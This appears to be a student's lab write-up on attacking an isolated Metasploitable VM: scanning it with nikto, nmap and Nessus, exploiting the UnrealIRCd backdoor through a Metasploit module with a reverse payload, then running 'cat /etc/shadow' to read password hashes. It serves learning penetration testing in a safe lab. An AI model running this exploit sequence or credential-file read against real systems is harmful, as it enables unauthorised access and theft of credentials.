
# Metasploit

![image](https://github.com/user-attachments/assets/077df3c9-a9c5-4e5b-8d59-ae6ad2b86007)

It’s intentionally vulnerable, so exposing it to the internet is a major security risk (it could be compromised within minutes and used for attacks).

VMware:
- Go to VM Settings > Network Adapter
- Set to Host-only or Custom (VMnet1)
- This keeps it isolated to your machine.

  ![image](https://github.com/user-attachments/assets/352259c7-8f6a-43b9-a42b-1c18af50c23b)

## Vulnerability Scanning 
```
nikto -h <machine's ip>
```
![image](https://github.com/user-attachments/assets/8a3fbce8-427f-4e60-ad68-05273d298c2e)

As indicated by the results 
- Apache/2.2.8 appears to be outaded
- HTTP TRACE method is active which suggests the host is vulnerable to XST

```
nmap -A -p- [Metasploitable_IP] -oN full_scan.txt
```
-Running a full nmao scan - A(Aggressive) -p(scanning all ports) -oN( output to file)

### Searchsploit ( included with kali linux)
- helps you find known exploits from the Exploit-DB database:

### Install Nessus
https://www.tenable.com/downloads/nessus?loginAttempted=true
```
sudo dpkg -i Nessus-10.8.3-ubuntu1604_amd64.deb
```
```
sudo systemctl start nessusd.service
```
```
https://localhost:8834
aka
https://kali:8834
```
![image](https://github.com/user-attachments/assets/3aa93fe0-76a3-4107-847c-3540b55c43d1)



- All of the detected critical vulnerabilities 
![image](https://github.com/user-attachments/assets/a8176b21-62a5-4508-90d4-d9e57d51f6f6)

### Exploit
I am going to exploit the UnrealRCd Backdoor Detection
- in the shell type msfconsole to start the metasploit service 

```
search unreal
```
- This was to find the payload available in metasploit for this vulnerability

Then I used 
```
search unreal
use 5
show options
set RHOSTS <ip_address>
show payloads
set payload 5
set LHOST <ip_address>
exploit 
```


![image](https://github.com/user-attachments/assets/b70d417c-46ec-4e92-a5d1-1a3e344761b3)


I recieved an error regarding saying the exploit was completed but no session was created 
ran on KAli
```
ip a
```
Then ping both ip address from the target to see which replies and rerun explot command
![image](https://github.com/user-attachments/assets/c3504204-2b84-4ee5-ae25-d4eadd02d28c)

So the following image show that I have accessed the target machine through the unreal backdoor vulnerability. I entered commanfd ``` ip a ``` and the response was the ip address of the target machine.
![image](https://github.com/user-attachments/assets/d6a103d8-afc3-4f6f-993d-6f64d9b56a3c)

```
cat /etc/shadow
```
- to get the usernames and the encrypted passwords

![image](https://github.com/user-attachments/assets/e3b5f7a7-bef9-4e68-bd24-89f772e26aaa)
